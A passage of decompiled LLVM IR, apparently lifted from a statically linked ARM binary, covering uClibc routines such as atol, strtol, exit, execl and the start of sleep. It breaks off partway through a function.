dec_label_pc_130f8:                               ; preds = %dec_label_pc_130e0
  %v2_130f8 = icmp ugt i32 %arg2, 62
  %v7_130f8 = icmp eq i32 %arg2, 63
  %v2_130fc = xor i1 %v7_130f8, true
  %v3_130fc = and i1 %v2_130f8, %v2_130fc
  br i1 %v3_130fc, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_130f8
  store i32 2, i32* @r4, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_130f8, %bb22
  %v1_131086 = phi i32 [ %v3_130c0, %dec_label_pc_130f8 ], [ 2, %bb22 ]
  %v2_13100 = xor i1 %v2_130f8, true
  %v3_13100 = or i1 %v7_130f8, %v2_13100
  br i1 %v3_13100, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  store i32 1, i32* @r4, align 4
  br label %bb25

bb25:                                             ; preds = %.thread10, %bb21, %bb20, %bb23, %bb24
  %v1_13110 = phi i32 [ 3, %bb21 ], [ %v1_131087, %bb20 ], [ %v1_131086, %bb23 ], [ 1, %bb24 ], [ 0, %.thread10 ]
  store i32 ptrtoint (i32* @global_var_1ab24.501 to i32), i32* %r2.global-to-local, align 4
  %v4_13108 = mul i32 %v1_13110, 4
  %v5_13108 = add i32 %v4_13108, ptrtoint (i32* @global_var_1ab24.501 to i32)
  store i32 %v5_13108, i32* %r3.global-to-local, align 4
  %v1_1310c = add i32 %v4_13108, add (i32 ptrtoint (i32* @global_var_1ab24.501 to i32), i32 20)
  %v2_1310c = inttoptr i32 %v1_1310c to i32*
  %v3_1310c = load i32, i32* %v2_1310c, align 4
  store i32 %v3_1310c, i32* %r1.global-to-local, align 4
  %v6_13110 = inttoptr i32 %v5_13108 to i32*
  %v7_13110 = load i32, i32* %v6_13110, align 4
  store i32 %v7_13110, i32* %r2.global-to-local, align 4
  %v1_13114 = add i32 %tmp, 4
  store i32 %v1_13114, i32* @r6, align 4
  %v4_13118 = mul i32 %v3_1310c, 4
  %v5_13118 = add i32 %v4_13118, %v1_13114
  store i32 %v5_13118, i32* %r3.global-to-local, align 4
  %v2_1311c = add i32 %arg3, 24
  %v3_1311c = inttoptr i32 %v2_1311c to i32*
  store i32 %v5_13118, i32* %v3_1311c, align 4
  %v0_13120 = load i32, i32* %r2.global-to-local, align 4
  %v1_13120 = load i32, i32* @r5, align 4
  %v2_13120 = add i32 %v1_13120, 20
  %v3_13120 = inttoptr i32 %v2_13120 to i32*
  store i32 %v0_13120, i32* %v3_13120, align 4
  %v0_13124 = load i32, i32* %r1.global-to-local, align 4
  %v1_13124 = load i32, i32* @r5, align 4
  %v2_13124 = add i32 %v1_13124, 16
  %v3_13124 = inttoptr i32 %v2_13124 to i32*
  store i32 %v0_13124, i32* %v3_13124, align 4
  %v0_13128 = load i32, i32* @r4, align 4
  %v1_13128 = load i32, i32* @r5, align 4
  %v2_13128 = add i32 %v1_13128, 12
  %v3_13128 = inttoptr i32 %v2_13128 to i32*
  store i32 %v0_13128, i32* %v3_13128, align 4
  %v0_1312c = load i32, i32* @r6, align 4
  %v1_1312c = load i32, i32* @r5, align 4
  %v2_1312c = add i32 %v1_1312c, 8
  %v3_1312c = inttoptr i32 %v2_1312c to i32*
  store i32 %v0_1312c, i32* %v3_1312c, align 4
  %v0_13130 = load i32, i32* @r5, align 4
  store i32 %v0_13130, i32* %r1.global-to-local, align 4
  %v0_13134 = load i32, i32* @r0, align 4
  %v2_13134 = inttoptr i32 %v0_13134 to i32*
  %v3_13134 = call i32 @srandom_r(i32* %v2_13134, i32 %v0_13130)
  store i32 %v3_13134, i32* %r0.global-to-local, align 4
  %v0_13138 = load i32, i32* @r4, align 4
  %v2_13138 = icmp eq i32 %v0_13138, 0
  br i1 %v2_13138, label %bb26, label %.thread4

bb26:                                             ; preds = %bb25
  %v1_1315412 = load i32, i32* @r7, align 4
  %v2_1315413 = inttoptr i32 %v1_1315412 to i32*
  store i32 0, i32* %v2_1315413, align 4
  %v1_13158 = load i32, i32* @r4, align 4
  store i32 %v1_13158, i32* %r0.global-to-local, align 4
  br label %bb27

.thread4:                                         ; preds = %bb25
  %v1_1313c = load i32, i32* @r5, align 4
  %v2_1313c = add i32 %v1_1313c, 4
  %v3_1313c = inttoptr i32 %v2_1313c to i32*
  %v4_1313c = load i32, i32* %v3_1313c, align 4
  %v1_13140 = load i32, i32* @r6, align 4
  %v3_13140 = sub i32 %v4_1313c, %v1_13140
  %v4_13144 = sdiv i32 %v3_13140, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_1314c = mul i32 %v4_13144, 5
  %v5_1314c = add i32 %v4_1314c, %v0_13138
  store i32 %v5_1314c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_13154 = load i32, i32* @r7, align 4
  %v2_13154 = inttoptr i32 %v1_13154 to i32*
  store i32 0, i32* %v2_13154, align 4
  %v1_1315c = load i32, i32* %r3.global-to-local, align 4
  %v2_1315c = load i32, i32* @r7, align 4
  %v3_1315c = inttoptr i32 %v2_1315c to i32*
  store i32 %v1_1315c, i32* %v3_1315c, align 4
  %v17_13160.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb27

bb27:                                             ; preds = %bb26, %.thread4
  %v17_13160 = phi i32 [ %v1_13158, %bb26 ], [ %v17_13160.pre, %.thread4 ]
  %v2_13160 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13160, i32* %r4.global-to-local, align 4
  ret i32 %v17_13160

dec_label_pc_13164:                               ; preds = %dec_label_pc_130e8
  %v0_13164 = call i32 @__errno_location()
  store i32 %v0_13164, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_1316c = inttoptr i32 %v0_13164 to i32*
  store i32 22, i32* %v2_1316c, align 4
  %v0_13170 = call i32 @__errno_location()
  %v0_13174 = load i32, i32* %r4.global-to-local, align 4
  %v2_13174 = inttoptr i32 %v0_13170 to i32*
  store i32 %v0_13174, i32* %v2_13174, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1317c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1317c, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i1 %v7_130f8, { 1, 0 }
  uselistorder i1 %v7_130d0, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_1ab24.501 to i32), i32 20), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1ab24.501 to i32), { 2, 3, 1, 0 }
  uselistorder i32 %arg2, { 3, 4, 0, 1, 6, 5, 2, 7 }
  uselistorder label %bb27, { 1, 0 }
  uselistorder label %bb25, { 4, 3, 0, 1, 2 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_1318c = call i32 @strtol()
  ret i32 %v0_1318c
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_13194 = call i32 @_stdlib_strto_l()
  ret i32 %v0_13194
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_13198 = load i32, i32* @r4, align 4
  store i32 %v3_13198, i32* %stack_var_-36, align 4
  %v0_1319c = load i32, i32* @r1, align 4
  store i32 %v0_1319c, i32* %sb.global-to-local, align 4
  %v0_131a0 = load i32, i32* @r2, align 4
  store i32 %v0_131a0, i32* %r5.global-to-local, align 4
  %v0_131a4 = load i32, i32* @r3, align 4
  store i32 %v0_131a4, i32* %fp.global-to-local, align 4
  %v0_131a8 = load i32, i32* @r0, align 4
  %v2_131bc.pre = load i32, i32* @global_var_231b0, align 4
  br label %dec_label_pc_131b4

dec_label_pc_131b4:                               ; preds = %dec_label_pc_131b4, %entry
  %v0_131ec = phi i32 [ %v0_131a8, %entry ], [ %v1_131b0, %dec_label_pc_131b4 ]
  store i32 %v0_131ec, i32* %r4.global-to-local, align 4
  %v1_131b8 = inttoptr i32 %v0_131ec to i8*
  %v2_131b8 = load i8, i8* %v1_131b8, align 1
  %v3_131b8 = zext i8 %v2_131b8 to i32
  %v3_131c0 = mul nuw nsw i32 %v3_131b8, 2
  %v4_131c0 = add i32 %v3_131c0, %v2_131bc.pre
  %v5_131c0 = inttoptr i32 %v4_131c0 to i8*
  %v6_131c0 = load i8, i8* %v5_131c0, align 1
  %v1_131c4 = and i8 %v6_131c0, 32
  %v2_131c4 = icmp eq i8 %v1_131c4, 0
  %v1_131b0 = add i32 %v0_131ec, 1
  br i1 %v2_131c4, label %dec_label_pc_131cc, label %dec_label_pc_131b4

dec_label_pc_131cc:                               ; preds = %dec_label_pc_131b4
  %v7_131cc = icmp eq i8 %v2_131b8, 43
  br i1 %v7_131cc, label %dec_label_pc_131ec, label %dec_label_pc_131d4

dec_label_pc_131d4:                               ; preds = %dec_label_pc_131cc
  %v7_131d4 = icmp eq i8 %v2_131b8, 45
  br i1 %v7_131d4, label %dec_label_pc_131ec, label %bb

bb:                                               ; preds = %dec_label_pc_131d4
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_131f0

dec_label_pc_131ec:                               ; preds = %dec_label_pc_131cc, %dec_label_pc_131d4
  %storemerge43 = phi i32 [ 1, %dec_label_pc_131d4 ], [ 0, %dec_label_pc_131cc ]
  store i32 %storemerge43, i32* %r7.global-to-local, align 4
  store i32 %v1_131b0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_131f0

dec_label_pc_131f0:                               ; preds = %bb, %dec_label_pc_131ec
  %v0_13210 = phi i32 [ %v0_131ec, %bb ], [ %v1_131b0, %dec_label_pc_131ec ]
  %v1_131f0 = and i32 %v0_131a0, -17
  %v3_131f0 = icmp eq i32 %v1_131f0, 0
  br i1 %v3_131f0, label %dec_label_pc_131fc, label %bb54

bb54:                                             ; preds = %dec_label_pc_131f0
  br label %bb58

dec_label_pc_131fc:                               ; preds = %dec_label_pc_131f0
  %v1_131fc = inttoptr i32 %v0_13210 to i8*
  %v2_131fc = load i8, i8* %v1_131fc, align 1
  %v7_13200 = icmp eq i8 %v2_131fc, 48
  %v1_13204 = add i32 %v0_131a0, 10
  store i32 %v1_13204, i32* %r5.global-to-local, align 4
  br i1 %v7_13200, label %dec_label_pc_13210, label %bb55

bb55:                                             ; preds = %dec_label_pc_131fc
  br label %.thread8

dec_label_pc_13210:                               ; preds = %dec_label_pc_131fc
  %v1_13210 = add i32 %v0_13210, 1
  %v2_13210 = inttoptr i32 %v1_13210 to i8*
  %v3_13210 = load i8, i8* %v2_13210, align 1
  %v4_13210 = zext i8 %v3_13210 to i32
  store i32 %v1_13210, i32* %r4.global-to-local, align 4
  %v1_13214 = or i32 %v4_13210, 32
  %v7_13218 = icmp eq i32 %v1_13214, 120
  %v1_1321c = add i32 %v0_131a0, 8
  store i32 %v1_1321c, i32* %r5.global-to-local, align 4
  br i1 %v7_13218, label %bb56, label %.thread8

bb56:                                             ; preds = %dec_label_pc_13210
  %v3_13228 = mul i32 %v1_1321c, 2
  store i32 %v3_13228, i32* %r5.global-to-local, align 4
  %v2_1322c = add i32 %v0_13210, 2
  store i32 %v2_1322c, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_13210, %bb55, %bb56
  %v1_132f028 = phi i32 [ %v0_131a8, %bb55 ], [ %v1_13210, %bb56 ], [ %v1_13210, %dec_label_pc_13210 ]
  %v0_1327819 = phi i32 [ %v0_13210, %bb55 ], [ %v2_1322c, %bb56 ], [ %v1_13210, %dec_label_pc_13210 ]
  %v0_13230 = phi i32 [ %v1_13204, %bb55 ], [ %v3_13228, %bb56 ], [ %v1_1321c, %dec_label_pc_13210 ]
  %v5_13234 = icmp slt i32 %v0_13230, 16
  br i1 %v5_13234, label %bb58, label %bb57

bb57:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb58

bb58:                                             ; preds = %bb54, %.thread8, %bb57
  %v1_132f027 = phi i32 [ %v0_131a8, %bb54 ], [ %v1_132f028, %.thread8 ], [ %v1_132f028, %bb57 ]
  %v0_1327818 = phi i32 [ %v0_13210, %bb54 ], [ %v0_1327819, %.thread8 ], [ %v0_1327819, %bb57 ]
  %v0_13248 = phi i32 [ %v0_131a0, %bb54 ], [ %v0_13230, %.thread8 ], [ 16, %bb57 ]
  %v1_13238 = add i32 %v0_13248, -2
  %tmp = icmp ugt i32 %v1_13238, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_13248

.thread:                                          ; preds = %bb58
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_132ec

dec_label_pc_13248:                               ; preds = %bb58
  %v2_13250 = urem i32 -1, %v0_13248
  %v1_13260 = urem i32 %v2_13250, 256
  store i32 %v1_13260, i32* %sl.global-to-local, align 4
  %v2_13264 = udiv i32 -1, %v0_13248
  store i32 0, i32* @ip, align 4
  store i32 %v2_13264, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13278

dec_label_pc_13274:                               ; preds = %bb65, %dec_label_pc_132d4
  %v0_13274 = phi i32 [ %v1_132a4, %bb65 ], [ %v0_13274.pre, %dec_label_pc_132d4 ]
  br label %dec_label_pc_13278

dec_label_pc_13278:                               ; preds = %dec_label_pc_13248, %dec_label_pc_13274
  %v1_132f025 = phi i32 [ %v1_132f027, %dec_label_pc_13248 ], [ %v0_13274, %dec_label_pc_13274 ]
  %v0_132a4 = phi i32 [ %v0_1327818, %dec_label_pc_13248 ], [ %v0_13274, %dec_label_pc_13274 ]
  %v1_13278 = inttoptr i32 %v0_132a4 to i8*
  %v2_13278 = load i8, i8* %v1_13278, align 1
  %v3_13278 = zext i8 %v2_13278 to i32
  %v1_1327c = add nsw i32 %v3_13278, -48
  %v1_13280 = urem i32 %v1_1327c, 256
  %v1_13288 = or i32 %v3_13278, 32
  %tmp73 = icmp ult i32 %v1_13280, 10
  br i1 %tmp73, label %bb60, label %dec_label_pc_13290

dec_label_pc_13290:                               ; preds = %dec_label_pc_13278
  %tmp74 = icmp ugt i32 %v1_13288, 96
  br i1 %tmp74, label %bb59, label %bb60

bb59:                                             ; preds = %dec_label_pc_13290
  %v1_13294 = add nsw i32 %v1_13288, -87
  %v5_1329c = urem i32 %v1_13294, 256
  br label %bb60

bb60:                                             ; preds = %dec_label_pc_13278, %dec_label_pc_13290, %bb59
  %v3_132cc = phi i32 [ %v1_13280, %dec_label_pc_13278 ], [ 40, %dec_label_pc_13290 ], [ %v5_1329c, %bb59 ]
  %v1_132a0 = load i32, i32* %r5.global-to-local, align 4
  %v1_132a4 = add i32 %v0_132a4, 1
  store i32 %v1_132a4, i32* %r4.global-to-local, align 4
  %v6_132a8 = icmp slt i32 %v3_132cc, %v1_132a0
  br i1 %v6_132a8, label %dec_label_pc_132ac, label %dec_label_pc_132ec.loopexit

dec_label_pc_132ac:                               ; preds = %bb60
  %v0_132ac = load i32, i32* @ip, align 4
  %v1_132ac = load i32, i32* %r8.global-to-local, align 4
  %v9_132ac = icmp eq i32 %v0_132ac, %v1_132ac
  br i1 %v9_132ac, label %.thread37, label %bb61

.thread37:                                        ; preds = %dec_label_pc_132ac
  br label %dec_label_pc_132bc

bb61:                                             ; preds = %dec_label_pc_132ac
  %v3_132ac = icmp ult i32 %v0_132ac, %v1_132ac
  br i1 %v3_132ac, label %dec_label_pc_132bc, label %dec_label_pc_132d4

dec_label_pc_132bc:                               ; preds = %bb61, %.thread37
  %v4_132c42240 = phi i32 [ 1, %.thread37 ], [ 0, %bb61 ]
  %v1_132bc = load i32, i32* %sl.global-to-local, align 4
  %v3_132bc = icmp uge i32 %v3_132cc, %v1_132bc
  %v9_132bc = icmp eq i32 %v3_132cc, %v1_132bc
  %v2_132c0 = xor i1 %v3_132bc, true
  %v3_132c0 = or i1 %v9_132bc, %v2_132c0
  br i1 %v3_132c0, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_132bc
  br label %bb63

bb63:                                             ; preds = %dec_label_pc_132bc, %bb62
  %v4_132c4 = phi i32 [ %v4_132c42240, %dec_label_pc_132bc ], [ 0, %bb62 ]
  %v2_132c4 = xor i1 %v9_132bc, true
  %v3_132c4 = and i1 %v3_132bc, %v2_132c4
  br i1 %v3_132c4, label %bb64, label %thread-pre-split

bb64:                                             ; preds = %bb63
  %v5_132c4 = urem i32 %v4_132c4, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb63, %bb64
  %v0_132c8 = phi i32 [ %v5_132c4, %bb64 ], [ %v4_132c4, %bb63 ]
  %v2_132c8 = icmp eq i32 %v0_132c8, 0
  br i1 %v2_132c8, label %bb65, label %dec_label_pc_132d4

bb65:                                             ; preds = %thread-pre-split
  %v4_132cc = mul i32 %v0_132ac, %v1_132a0
  %v5_132cc = add i32 %v4_132cc, %v3_132cc
  store i32 %v5_132cc, i32* @ip, align 4
  br label %dec_label_pc_13274

dec_label_pc_132d4:                               ; preds = %bb61, %thread-pre-split
  %v0_132d4 = call i32 @__errno_location()
  %v0_132d8 = load i32, i32* %r7.global-to-local, align 4
  %v1_132d8 = load i32, i32* %fp.global-to-local, align 4
  %v2_132d8 = and i32 %v1_132d8, %v0_132d8
  store i32 %v2_132d8, i32* %r7.global-to-local, align 4
  store i32 -1, i32* @ip, align 4
  %v2_132e4 = inttoptr i32 %v0_132d4 to i32*
  store i32 34, i32* %v2_132e4, align 4
  %v0_13274.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13274

dec_label_pc_132ec.loopexit:                      ; preds = %bb60
  %v0_132ec.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_132ec

dec_label_pc_132ec:                               ; preds = %.thread, %dec_label_pc_132ec.loopexit
  %v1_132f0 = phi i32 [ %v1_132f025, %dec_label_pc_132ec.loopexit ], [ %v1_132f027, %.thread ]
  %v2_132f0 = phi i32 [ %v0_132ec.pre, %dec_label_pc_132ec.loopexit ], [ %v0_1319c, %.thread ]
  %v2_132ec = icmp eq i32 %v2_132f0, 0
  br i1 %v2_132ec, label %bb67, label %bb66

bb66:                                             ; preds = %dec_label_pc_132ec
  %v3_132f0 = inttoptr i32 %v2_132f0 to i32*
  store i32 %v1_132f0, i32* %v3_132f0, align 4
  br label %bb67

bb67:                                             ; preds = %dec_label_pc_132ec, %bb66
  %v0_132f4 = load i32, i32* %r7.global-to-local, align 4
  %v2_132f4 = icmp eq i32 %v0_132f4, 0
  %. = select i1 %v2_132f4, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v0_13300 = load i32, i32* %fp.global-to-local, align 4
  %v2_13300 = icmp eq i32 %v0_13300, 0
  %v0_13324.pre.pre = load i32, i32* @ip, align 4
  br i1 %v2_13300, label %dec_label_pc_1331c, label %bb70

bb70:                                             ; preds = %bb67
  %tmp75 = icmp ugt i32 %v0_13324.pre.pre, %.
  br i1 %tmp75, label %dec_label_pc_1330c, label %dec_label_pc_1331c

dec_label_pc_1330c:                               ; preds = %bb70
  %v0_1330c = call i32 @__errno_location()
  %v2_13314 = inttoptr i32 %v0_1330c to i32*
  store i32 34, i32* %v2_13314, align 4
  %v0_13318 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13318, i32* @ip, align 4
  %v0_1331c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1331c

dec_label_pc_1331c:                               ; preds = %bb70, %bb67, %dec_label_pc_1330c
  %v0_13324.pre = phi i32 [ %v0_13324.pre.pre, %bb70 ], [ %v0_13318, %dec_label_pc_1330c ], [ %v0_13324.pre.pre, %bb67 ]
  %v0_1331c = phi i32 [ %v0_132f4, %bb70 ], [ %v0_1331c.pre, %dec_label_pc_1330c ], [ %v0_132f4, %bb67 ]
  %v2_1331c = icmp eq i32 %v0_1331c, 0
  br i1 %v2_1331c, label %dec_label_pc_1331c._crit_edge, label %bb71

bb71:                                             ; preds = %dec_label_pc_1331c
  %v2_13320 = sub i32 0, %v0_13324.pre
  store i32 %v2_13320, i32* @ip, align 4
  br label %dec_label_pc_1331c._crit_edge

dec_label_pc_1331c._crit_edge:                    ; preds = %dec_label_pc_1331c, %bb71
  %v0_13324 = phi i32 [ %v2_13320, %bb71 ], [ %v0_13324.pre, %dec_label_pc_1331c ]
  %v2_13328 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_13328, i32* @r4, align 4
  ret i32 %v0_13324

; uselistorder directives
  uselistorder i32 %v0_13324.pre, { 1, 0 }
  uselistorder i32 %v0_13324.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_132c4, { 1, 0 }
  uselistorder i1 %v3_132bc, { 1, 0 }
  uselistorder i32 %v1_132bc, { 1, 0 }
  uselistorder i32 %v1_132a4, { 1, 0 }
  uselistorder i32 %v1_13288, { 1, 0 }
  uselistorder i32 %v1_13280, { 1, 0 }
  uselistorder i32 %v0_13274, { 1, 0 }
  uselistorder i32 %v0_13248, { 1, 0, 2 }
  uselistorder i32 %v3_13228, { 1, 0 }
  uselistorder i32 %v1_1321c, { 1, 0, 2 }
  uselistorder i32 %v0_13210, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_131b0, { 1, 0, 2 }
  uselistorder i32 %v0_131a8, { 1, 0, 2 }
  uselistorder i32 %v0_131a0, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 2, 3, 0, 1, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_1331c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1331c, { 2, 0, 1 }
  uselistorder label %bb67, { 1, 0 }
  uselistorder label %dec_label_pc_132ec, { 1, 0 }
  uselistorder label %dec_label_pc_132d4, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb63, { 1, 0 }
  uselistorder label %bb60, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13278, { 1, 0 }
  uselistorder label %dec_label_pc_13274, { 1, 0 }
  uselistorder label %bb58, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_131f0, { 1, 0 }
  uselistorder label %dec_label_pc_131ec, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_13330 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r4, align 4
  store i32 %v2_13330, i32* @r0, align 4
  %v1_1334c = call i32 @__pthread_return_void()
  %v1_1335c = call i32 @__pthread_return_0()
  %v2_13364 = load i32, i32* @global_var_29768.514, align 4
  %v2_13368 = icmp eq i32 %v2_13364, 0
  br i1 %v2_13368, label %.thread1, label %bb

bb:                                               ; preds = %entry
  call void @__pseudo_branch(i32 %v2_13364)
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  store i32 %v2_13330, i32* @r0, align 4
  %v1_13388 = call i32 @__pthread_return_void()
  store i32 %v1_13388, i32* @r0, align 4
  %v1_1338c = call i32 @__GI___uClibc_fini(i32 %v1_13388)
  store i32 78752, i32* @lr, align 4
  %v2_1339c = call i32 @_stdio_term()
  %v0_133a0 = load i32, i32* @r4, align 4
  %v1_133a4 = call i32 @__GI__exit(i32 %v0_133a0)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 0, 7, 6, 5, 4, 3, 2, 9, 8, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_133c4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_133c4, i32* %ip.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v2_133d4 = ptrtoint i32* %stack_var_-32 to i32
  %v2_133d8 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_133d8, i32* %stack_var_-32, align 4
  br label %dec_label_pc_133e4

dec_label_pc_133e4:                               ; preds = %dec_label_pc_133e4, %entry
  %v0_133f8 = phi i32 [ %v1_133f8, %dec_label_pc_133e4 ], [ 0, %entry ]
  %v3_133e4 = phi i32 [ %v1_133ec, %dec_label_pc_133e4 ], [ %v2_133d8, %entry ]
  %v1_133e8 = inttoptr i32 %v3_133e4 to i32*
  %v2_133e8 = load i32, i32* %v1_133e8, align 4
  %v1_133ec = add i32 %v3_133e4, 4
  %v2_133f0 = icmp eq i32 %v2_133e8, 0
  store i32 %v1_133ec, i32* %stack_var_-32, align 4
  %v1_133f8 = add i32 %v0_133f8, 1
  store i32 %v1_133f8, i32* @lr, align 4
  br i1 %v2_133f0, label %dec_label_pc_13400, label %dec_label_pc_133e4

dec_label_pc_13400:                               ; preds = %dec_label_pc_133e4
  %v3_13400.neg = mul i32 %v1_133f8, -4
  %v1_13404.neg = add i32 %v2_133d4, -8
  %v2_13408 = add i32 %v1_13404.neg, %v3_13400.neg
  %v2_13410 = inttoptr i32 %v2_13408 to i32*
  store i32 %arg2, i32* %v2_13410, align 4
  store i32 %v2_133d8, i32* %stack_var_-32, align 4
  %v0_1341c = load i32, i32* @sp, align 4
  store i32 %v0_1341c, i32* @r1, align 4
  store i32 %v0_1341c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13424

dec_label_pc_13424:                               ; preds = %dec_label_pc_13424.dec_label_pc_13424_crit_edge, %dec_label_pc_13400
  %v1_13438 = phi i32 [ %v5_13438, %dec_label_pc_13424.dec_label_pc_13424_crit_edge ], [ %v0_1341c, %dec_label_pc_13400 ]
  %v3_13424 = phi i32 [ %v3_13424.pre, %dec_label_pc_13424.dec_label_pc_13424_crit_edge ], [ %v2_133d8, %dec_label_pc_13400 ]
  %v1_13428 = inttoptr i32 %v3_13424 to i32*
  %v2_13428 = load i32, i32* %v1_13428, align 4
  %v0_1342c = load i32, i32* @lr, align 4
  %v1_1342c = add i32 %v0_1342c, -1
  store i32 %v1_1342c, i32* @lr, align 4
  %v7_1342c = icmp eq i32 %v0_1342c, 1
  %v1_13430 = add i32 %v3_13424, 4
  store i32 %v1_13430, i32* %stack_var_-32, align 4
  %v2_13438 = add i32 %v1_13438, 4
  %v3_13438 = inttoptr i32 %v2_13438 to i32*
  store i32 %v2_13428, i32* %v3_13438, align 4
  %v4_13438 = load i32, i32* %ip.global-to-local, align 4
  %v5_13438 = add i32 %v4_13438, 4
  store i32 %v5_13438, i32* %ip.global-to-local, align 4
  br i1 %v7_1342c, label %dec_label_pc_13440, label %dec_label_pc_13424.dec_label_pc_13424_crit_edge

dec_label_pc_13424.dec_label_pc_13424_crit_edge:  ; preds = %dec_label_pc_13424
  %v3_13424.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_13424

dec_label_pc_13440:                               ; preds = %dec_label_pc_13424
  %v2_13444 = load i32, i32* @global_var_29770.519, align 4
  store i32 %v2_13444, i32* @r2, align 4
  %v0_13448 = call i32 @__GI_execve()
  ret i32 %v0_13448

; uselistorder directives
  uselistorder i32 %v5_13438, { 1, 0 }
  uselistorder i32 %v0_1342c, { 1, 0 }
  uselistorder i32 %v1_133f8, { 0, 2, 1 }
  uselistorder i32 %v1_133ec, { 1, 0 }
  uselistorder i32 %v3_133e4, { 1, 0 }
  uselistorder i32 %v2_133d8, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-424 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_13458 = load i32, i32* @r4, align 4
  store i32 %v3_13458, i32* %stack_var_-20, align 4
  %v6_13458 = load i32, i32* @r5, align 4
  %v9_13458 = load i32, i32* @r6, align 4
  %v16_13458 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %arg1, i32* %ip.global-to-local, align 4
  %v2_1345c = icmp eq i32 %arg1, 0
  %v2_13460 = ptrtoint i32* %stack_var_-424 to i32
  br i1 %v2_1345c, label %dec_label_pc_135e4, label %dec_label_pc_13478.preheader

dec_label_pc_13478.preheader:                     ; preds = %entry
  store i32 31, i32* %r1.global-to-local, align 4
  %v5_1348017 = add i32 %v16_13458, 124
  br label %dec_label_pc_13470

dec_label_pc_13470:                               ; preds = %dec_label_pc_13478.preheader, %dec_label_pc_13470
